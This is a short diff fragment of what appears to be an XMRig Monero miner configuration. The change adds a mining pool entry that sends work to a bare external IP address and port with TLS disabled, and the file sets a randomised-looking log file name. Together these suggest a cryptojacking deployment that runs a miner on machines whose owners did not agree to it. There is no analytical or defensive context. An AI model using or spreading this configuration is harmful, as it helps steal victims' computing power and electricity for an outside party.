@@ -59,7 +59,23 @@
     "donate-over-proxy": 0,
     "log-file": "logekZrs.txt",
     "pools": [
+	{
+            "algo": "rx/0",
+            "coin": null,
+            "url": "185.208.156.197:1307",
 
+            "rig-id": null,
+"nicehash": true,
+            "keepalive": true,
+
+"enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        } , 
 	{
             "algo": "rx/0",
             "coin": null,
